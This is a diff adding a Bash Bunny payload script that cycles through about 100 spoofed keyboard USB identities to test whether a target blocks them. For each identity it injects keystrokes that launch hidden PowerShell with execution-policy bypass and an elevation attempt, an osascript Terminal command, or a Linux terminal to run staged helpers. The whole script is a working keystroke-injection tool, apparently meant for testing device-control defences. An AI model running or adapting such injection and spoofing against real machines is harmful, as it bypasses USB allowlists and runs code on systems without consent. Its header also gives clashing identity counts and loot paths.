@@ -1,0 +1,346 @@
+#!/bin/bash
+# =============================================================================
+#  Payload   : keyboard-id-spoof-test
+#  Author    : <operator>
+#  Device    : Bash Bunny Mark I / Mark II
+#  Version   : 1.0
+#
+#  Purpose   : Iterates through 100 keyboard USB identities (VID/PID/MFR/PROD/SER)
+#              via HID spoofing. For each identity the BB presents itself as that
+#              keyboard, injects keystrokes to run a staged validation helper on
+#              the target, and checks whether the target wrote output back to
+#              BashBunny STORAGE. Results are saved per-identity and aggregated
+#              in a summary table.
+#
+#              Entry 0 is the Bash Bunny's own native VID 0xF000. If the native
+#              test succeeds it is annotated as such in summary.txt.
+#
+#  Runtime   : ~15–20 min (109 identities × ~9 s each)
+#              Reduce WAIT_CMD if target responds quickly.
+#
+#  Loot (retrieve via STORAGE mode after run):
+#    BashBunny:\summary.txt             — pass/fail table for all identities
+#    BashBunny:\results\<VID>_<PID>.txt — per-identity USB enumeration output
+#
+#  Helper scripts (staged from this folder to STORAGE):
+#    kbtest_win.ps1    — Windows WMI/PnP enumeration
+#    kbtest_unix.sh    — macOS ioreg / Linux lsusb + udevadm enumeration
+#
+#  Deploy:
+#    1. Copy this folder to /payloads/switch1/  (or switch2/)
+#    2. Ensure kbtest_unix.sh is executable: chmod +x .../kbtest_unix.sh
+#    3. Plug BB into target with switch in position 1 (or 2)
+#
+#  LED convention:
+#    Magenta solid  — setup: staging helper scripts
+#    Cyan solid     — iterating: switching to next identity
+#    Yellow fast    — attack: injecting keystrokes
+#    Green blink    — success: result file received from target
+#    Red blink      — timeout: no result file; identity may have been blocked
+#    Green solid    — finish: all identities tested
+# =============================================================================
+
+source /usr/lib/bunny/bunny_helpers.sh 2>/dev/null || true
+
+PAYLOAD_DIR="/payloads/switch${SWITCH_POSITION}"
+UDISK="/root/udisk"
+mkdir -p "${UDISK}/loot/key_id"
+RESULTS_DIR="${UDISK}/loot/key_id/spoof/results/"
+SUMMARY="${UDISK}/loot/key_id/spoof/summary.txt"
+
+WAIT_ENUM=3    # seconds to wait for USB re-enumeration after ATTACKMODE change
+WAIT_CMD=8     # seconds to wait for target to run helper and write result file
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Keyboard identity database
+# Format: "VID PID Manufacturer Product Serial"
+#   VID / PID : 4-digit uppercase hex (no 0x prefix)
+#   Entry 0   : Bash Bunny native identity — no VID/PID override applied
+# ─────────────────────────────────────────────────────────────────────────────
+KEYBOARDS=(
+    # ── 00: Bash Bunny native (no spoofing) ───────────────────────────────────
+    "F000 0200 HakShop BashBunny BUNNY0001"
+
+    # ── Apple ─────────────────────────────────────────────────────────────────
+    "05AC 0201 Apple USB_Keyboard_M2452 APL0001"
+    "05AC 0202 Apple USB_Keyboard_ALPS APL0002"
+    "05AC 0205 Apple Extended_Keyboard_Mitsumi APL0003"
+    "05AC 020B Apple USB_Keyboard_M7803 APL0004"
+    "05AC 0220 Apple Aluminum_Keyboard_ISO APL0005"
+    "05AC 0221 Apple Aluminum_Keyboard_ANSI APL0006"
+    "05AC 0267 Apple Magic_Keyboard_A1644 APL0007"
+    "05AC 026C Apple Magic_Keyboard_Numpad APL0008"
+
+    # ── Microsoft ─────────────────────────────────────────────────────────────
+    "045E 0063 Microsoft Wireless_Natural_Keyboard MSK0001"
+    "045E 0745 Microsoft Wireless_Keyboard_5000 MSK0002"
+    "045E 0750 Microsoft Wired_Keyboard_600 MSK0003"
+    "045E 0752 Microsoft Wired_Keyboard_400 MSK0004"
+    "045E 07F8 Microsoft Wired_Keyboard_600v2 MSK0005"
+    "045E 0800 Microsoft USB_Keyboard MSK0006"
+
+    # ── Logitech ──────────────────────────────────────────────────────────────
+    "046D C222 Logitech G15_Keyboard LGK0001"
+    "046D C228 Logitech G19_Keyboard LGK0002"
+    "046D C31C Logitech K350 LGK0003"
+    "046D C318 Logitech K800_Illuminated LGK0004"
+    "046D C338 Logitech G610 LGK0005"
+    "046D C33B Logitech G513 LGK0006"
+    "046D C33F Logitech G_Pro_X LGK0007"
+    "046D C343 Logitech G915_TKL LGK0008"
+    "046D B35B Logitech MX_Keys LGK0009"
+
+    # ── Razer ─────────────────────────────────────────────────────────────────
+    "1532 0209 Razer BlackWidow_Chroma_V2 RZR0001"
+    "1532 021E Razer Ornata_Chroma RZR0002"
+    "1532 0225 Razer Huntsman_Elite RZR0003"
+    "1532 0232 Razer BlackWidow_Elite RZR0004"
+    "1532 0243 Razer Huntsman_Mini RZR0005"
+    "1532 025A Razer BlackWidow_V3_Pro RZR0006"
+    "1532 0270 Razer DeathStalker_V2 RZR0007"
+    "1532 028D Razer BlackWidow_V4_Pro RZR0008"
+
+    # ── Corsair ───────────────────────────────────────────────────────────────
+    "1B1C 1B04 Corsair Vengeance_K90 COR0001"
+    "1B1C 1B09 Corsair K65_RGB COR0002"
+    "1B1C 1B15 Corsair K70_RGB COR0003"
+    "1B1C 1B37 Corsair K100_RGB COR0004"
+    "1B1C 1B3D Corsair K55_RGB COR0005"
+    "1B1C 1B6B Corsair K55_RGB_Pro COR0006"
+
+    # ── SteelSeries ───────────────────────────────────────────────────────────
+    "1038 1600 SteelSeries Apex_M750 STL0001"
+    "1038 1610 SteelSeries Apex_M800 STL0002"
+    "1038 1614 SteelSeries Apex_7 STL0003"
+    "1038 1616 SteelSeries Apex_Pro STL0004"
+    "1038 1622 SteelSeries Apex_3 STL0005"
+    "1038 1624 SteelSeries Apex_5 STL0006"
+
+    # ── Ducky / Holtek ────────────────────────────────────────────────────────
+    "04D9 0141 Ducky Pocket_Calculator DCK0001"
+    "04D9 0188 Ducky One_2_Mini DCK0002"
+    "04D9 1188 Ducky One_2_RGB_TKL DCK0003"
+    "04D9 A096 Ducky Shine_7 DCK0004"
+    "04D9 A0D3 Ducky One_3_SF DCK0005"
+    "04D9 A0D4 Ducky One_3 DCK0006"
+
+    # ── ASUS ROG ──────────────────────────────────────────────────────────────
+    "0B05 1837 ASUS ROG_Claymore ASR0001"
+    "0B05 1866 ASUS ROG_Strix_Flare_II ASR0002"
+    "0B05 1869 ASUS ROG_Falchion ASR0003"
+    "0B05 1960 ASUS ROG_Scope_RX ASR0004"
+    "0B05 196B ASUS ROG_Strix_Scope_TKL ASR0005"
+
+    # ── Keychron ──────────────────────────────────────────────────────────────
+    "3434 0161 Keychron Q1 KCH0001"
+    "3434 0163 Keychron Q6 KCH0002"
+    "3434 01E0 Keychron Q11 KCH0003"
+    "3434 0280 Keychron K8_Pro KCH0004"
+    "3434 02A0 Keychron K10_Pro KCH0005"
+
+    # ── Dell ──────────────────────────────────────────────────────────────────
+    "413C 2003 Dell USB_Keyboard DEL0001"
+    "413C 2005 Dell MultiMedia_Keyboard DEL0002"
+    "413C 2107 Dell USB_Multimedia_Keyboard DEL0003"
+    "413C 2113 Dell KB216_Wired DEL0004"
+
+    # ── HP ────────────────────────────────────────────────────────────────────
+    "03F0 0024 HP USB_Keyboard HPK0001"
+    "03F0 034A HP USB_Slim_Keyboard HPK0002"
+    "03F0 0F4A HP Classic_Wired_Keyboard HPK0003"
+    "03F0 1548 HP USB_Multimedia_Keyboard HPK0004"
+
+    # ── Cherry ────────────────────────────────────────────────────────────────
+    "046A 0001 Cherry Cymotion_Master CHR0001"
+    "046A 0023 Cherry USB_Keyboard CHR0002"
+    "046A 0066 Cherry MX_Board CHR0003"
+    "046A 00D2 Cherry G80_3000 CHR0004"
+
+    # ── Lite-On (OEM) ─────────────────────────────────────────────────────────
+    "04CA 0040 Lite-On USB_Keyboard LON0001"
+    "04CA 006F Lite-On HP_USB_Keyboard LON0002"
+    "04CA 0058 Lite-On USB_Multimedia_Keyboard LON0003"
+
+    # ── Mad Catz ──────────────────────────────────────────────────────────────
+    "0738 1107 Mad_Catz V7_Keyboard MCZ0001"
+    "0738 1108 Mad_Catz Strike_5 MCZ0002"
+    "0738 11A9 Mad_Catz Strike_7 MCZ0003"
+
+    # ── Kinesis ───────────────────────────────────────────────────────────────
+    "05F3 0007 Kinesis Advantage_PRO KIN0001"
+    "29EA 0102 Kinesis Freestyle_Edge_RGB KIN0002"
+
+    # ── HyperX (Kingston) ─────────────────────────────────────────────────────
+    "0951 16D0 HyperX Alloy_FPS HYX0001"
+    "0951 16DC HyperX Alloy_Elite HYX0002"
+    "0951 16E5 HyperX Alloy_Origins HYX0003"
+    "0951 16E6 HyperX Alloy_Origins_Core HYX0004"
+
+    # ── Cooler Master ─────────────────────────────────────────────────────────
+    "2516 003A Cooler_Master MasterKeys_Pro CML0001"
+    "2516 0067 Cooler_Master MK730 CML0002"
+    "2516 006B Cooler_Master SK630 CML0003"
+
+    # ── Vortex / iKBC ─────────────────────────────────────────────────────────
+    "04D9 A115 Vortex Race3 VTX0001"
+    "04D9 0169 iKBC MF108 IKB0001"
+
+    # ── ZSA Technology ────────────────────────────────────────────────────────
+    "3297 1969 ZSA Moonlander_Mk1 ZSA0001"
+    "FEE0 1001 ZSA ErgoDox_EZ ZSA0002"
+
+    # ── Topre / PFU (HHKB / Realforce) ───────────────────────────────────────
+    "04FE 0016 PFU HHKB_Professional HHK0001"
+    "0853 0100 Topre Realforce_108UH TPR0001"
+    "0853 011C Topre Realforce_TKL_S TPR0002"
+
+    # ── Glorious ──────────────────────────────────────────────────────────────
+    "258A 0049 Glorious GMMK_Pro GLO0001"
+
+    # ── Generic / OEM (commonly found in enterprise environments) ─────────────
+    "04D9 A01C Holtek Wireless_Keyboard HLT0001"
+    "0A81 0101 Chesen_Electronics USB_Keyboard CHS0001"
+    "1A2C 0E24 China_Resource_Semico Das_Keyboard_4 DAS0001"
+    "1A2C 2124 China_Resource_Semico USB_Keyboard CRS0001"
+    "1C4F 0002 SiGma_Micro USB_Keyboard SGM0001"
+)
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Stage helper scripts onto STORAGE (udisk) at payload start
+# ─────────────────────────────────────────────────────────────────────────────
+LED SETUP
+
+mkdir -p "$RESULTS_DIR"
+cp "${PAYLOAD_DIR}/kbtest_win.ps1"  "${UDISK}/kbtest_win.ps1"
+cp "${PAYLOAD_DIR}/kbtest_unix.sh"  "${UDISK}/kbtest_unix.sh"
+chmod +x "${UDISK}/kbtest_unix.sh"
+
+PASS=0
+FAIL=0
+TOTAL=${#KEYBOARDS[@]}
+
+{
+    echo "=== keyboard-id-spoof-test: Summary ==="
+    echo "Started   : $(date '+%Y-%m-%d %H:%M:%S')"
+    echo "Identities: $((TOTAL - 1)) spoofed + 1 native"
+    echo ""
+    printf "%-6s %-6s %-22s %-30s %-10s %s\n" "VID" "PID" "Manufacturer" "Product" "Serial" "Result"
+    printf "%-6s %-6s %-22s %-30s %-10s %s\n" "------" "------" "----------------------" "------------------------------" "----------" "-------"
+} > "$SUMMARY"
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Main loop: iterate through all keyboard identities
+# ─────────────────────────────────────────────────────────────────────────────
+IDX=0
+for entry in "${KEYBOARDS[@]}"; do
+    read -r vid pid mfr prod ser <<< "$entry"
+
+    LED CYAN
+
+    # Determine if this is the native test (index 0) or a spoofed identity
+    if [ "$IDX" -eq 0 ]; then
+        SPOOF_MODE="NATIVE"
+        NOTE="[Bash Bunny native VID 0xF000]"
+    else
+        SPOOF_MODE="SPOOFED"
+        NOTE=""
+    fi
+
+    # ── Write current identity to udisk (target will read this via STORAGE) ──
+    echo "$vid $pid $mfr $prod $ser $SPOOF_MODE" > "${UDISK}/current_test.txt"
+
+    # ── Set USB personality ───────────────────────────────────────────────────
+    if [ "$IDX" -eq 0 ]; then
+        # Native: no VID/PID override
+        ATTACKMODE HID STORAGE
+    else
+        ATTACKMODE HID STORAGE VID_${vid} PID_${pid} MAN_"${mfr}" PROD_"${prod}" SER_"${ser}"
+    fi
+
+    # Wait for target OS to enumerate the (re-)presented USB device
+    sleep $WAIT_ENUM
+
+    LED ATTACK
+    DUCKY_LANG us
+
+    # ── Windows: Run dialog → PowerShell → kbtest_win.ps1 ────────────────────
+    RUN WIN "powershell -W H -NoP -NonI -Exec Bypass -C \"\$b=((gwmi Win32_Volume|?{\$_.Label -eq 'BashBunny'})|Select -First 1).Name;if(\$b){Start-Process powershell -W H -Verb RunAs -Args '-W H -NoP -NonI -Exec Bypass -F \\\"'+\$b+'kbtest_win.ps1\\\"' -EA SilentlyContinue;powershell -W H -NoP -NonI -Exec Bypass -F \\\"\$b\\kbtest_win.ps1\\\"}\""
+
+    Q DELAY 1500
+
+    # ── macOS: Spotlight → Terminal → kbtest_unix.sh ──────────────────────────
+    RUN OSX "osascript -e 'tell application \"Terminal\" to do script \"bash /Volumes/BashBunny/kbtest_unix.sh 2>/dev/null &\"'"
+
+    Q DELAY 1000
+
+    # ── Linux: Ctrl+Alt+T → kbtest_unix.sh (tries common mount paths) ─────────
+    Q CTRL ALT t
+    Q DELAY 1500
+    Q STRING bash /run/media/$USER/BashBunny/kbtest_unix.sh 2>/dev/null || bash /media/$USER/BashBunny/kbtest_unix.sh 2>/dev/null || bash /media/BashBunny/kbtest_unix.sh 2>/dev/null &
+    Q ENTER
+    Q DELAY 500
+    Q ALT F4
+
+    # ── Wait for target to write result file ──────────────────────────────────
+    sleep $WAIT_CMD
+
+    # ── Check for result ──────────────────────────────────────────────────────
+    RESULT_FILE="${RESULTS_DIR}/${vid}_${pid}.txt"
+    if [ -f "$RESULT_FILE" ]; then
+        STATUS="SUCCESS"
+        PASS=$((PASS + 1))
+        LED GREEN FAST
+        sleep 1
+    else
+        STATUS="TIMEOUT"
+        FAIL=$((FAIL + 1))
+        LED RED FAST
+        sleep 1
+        # Write a stub so the operator knows it was attempted
+        {
+            echo "=== keyboard-id-spoof-test: No response ==="
+            echo "VID  : $vid   PID  : $pid"
+            echo "MFR  : $mfr   PROD : $prod   SER  : $ser"
+            echo "Mode : $SPOOF_MODE"
+            echo "Note : Target did not write a result file within ${WAIT_CMD}s."
+            echo "       The HID device may have been blocked, the terminal"
+            echo "       did not open, or the helper script path was not found."
+        } > "$RESULT_FILE"
+    fi
+
+    # Annotate native result with special note
+    if [ "$IDX" -eq 0 ] && [ "$STATUS" = "SUCCESS" ]; then
+        echo "" >> "$RESULT_FILE"
+        echo "NOTE: This result was obtained using the Bash Bunny native identity" >> "$RESULT_FILE"
+        echo "      (VID 0xF000). No USB device spoofing was applied." >> "$RESULT_FILE"
+    fi
+
+    # Append row to summary
+    printf "%-6s %-6s %-22s %-30s %-10s %s %s\n" \
+        "$vid" "$pid" "$mfr" "$prod" "$ser" "$STATUS" "$NOTE" >> "$SUMMARY"
+
+    IDX=$((IDX + 1))
+done
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Finalise
+# ─────────────────────────────────────────────────────────────────────────────
+{
+    echo ""
+    echo "Finished  : $(date '+%Y-%m-%d %H:%M:%S')"
+    echo "Passed    : $PASS / $((IDX - 1)) spoofed identities (+ native)"
+    echo "Failed    : $FAIL"
+    echo ""
+    echo "Retrieve loot:"
+    echo "  STORAGE mode: plug BB and open BashBunny:\\ on host"
+    echo "  SSH (arming): ssh root@172.16.64.1  →  /root/udisk/results/"
+} >> "$SUMMARY"
+
+if [ "$PASS" -gt 0 ]; then
+    LED FINISH
+else
+    LED FAIL
+fi
+
+sleep 3
+LED OFF
